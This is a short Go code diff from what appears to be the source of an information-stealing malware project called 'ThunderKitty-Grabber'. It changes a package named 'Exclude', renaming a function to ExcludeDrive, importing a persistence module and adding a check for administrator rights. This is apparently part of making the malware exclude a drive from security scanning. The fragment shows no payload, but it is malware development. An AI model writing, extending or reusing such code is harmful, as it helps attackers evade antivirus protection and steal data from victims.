@@ -1,6 +1,7 @@
 package Exclude
 
 import (
+	Persistence "ThunderKitty-Grabber/utils/persistence"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -8,7 +9,10 @@ import (
 	"unsafe"
 )
 
-func FileExtensions() {
+func ExcludeDrive() {
+	if !Persistence.IsAdmin() {
+		return
+	}
 	dir, err := os.Getwd()
 	if err != nil {
 		fmt.Println(err)
